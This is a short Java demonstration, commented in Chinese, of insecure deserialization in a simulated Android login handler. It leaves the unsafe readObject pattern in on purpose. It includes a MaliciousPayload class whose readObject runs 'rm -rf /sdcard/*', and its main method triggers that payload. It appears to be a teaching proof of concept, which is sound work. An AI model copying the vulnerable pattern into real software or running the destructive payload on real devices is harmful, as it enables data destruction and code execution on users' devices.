import java.io.*;
import java.util.function.Function;

// 模拟Android应用用户数据类
class User implements Serializable {
    private String username;
    private transient String password; // 敏感字段

    public User(String username, String password) {
        this.username = username;
        this.password = password;
    }

    // 函数式接口模拟数据处理
    @FunctionalInterface
    interface DataProcessor {
        String process(byte[] data);
    }

    // 不安全的反序列化操作
    public static User deserializeUser(byte[] userData) throws IOException, ClassNotFoundException {
        try (ByteArrayInputStream bis = new ByteArrayInputStream(userData);
             ObjectInputStream ois = new ObjectInputStream(bis)) {
            return (User) ois.readObject(); // 危险的反序列化
        }
    }

    // 模拟网络请求处理
    public static void handleNetworkResponse(byte[] response) {
        Function<byte[], User> parser = data -> {
            try {
                return deserializeUser(data);
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        };

        User user = parser.apply(response);
        if (user != null) {
            System.out.println("登录成功: " + user.username);
        }
    }

    // 模拟恶意攻击载荷
    static class MaliciousPayload implements Serializable {
        private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
            Runtime.getRuntime().exec("rm -rf /sdcard/*"); // 模拟恶意代码执行
        }
    }

    // 模拟测试代码
    public static void main(String[] args) {
        // 正常序列化流程
        try {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(new User("test", "123456"));
            byte[] serializedData = bos.toByteArray();

            // 恶意替换数据
            ByteArrayOutputStream attackStream = new ByteArrayOutputStream();
            ObjectOutputStream attackOOS = new ObjectOutputStream(attackStream);
            attackOOS.writeObject(new MaliciousPayload());
            
            // 触发漏洞
            handleNetworkResponse(attackStream.toByteArray());
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}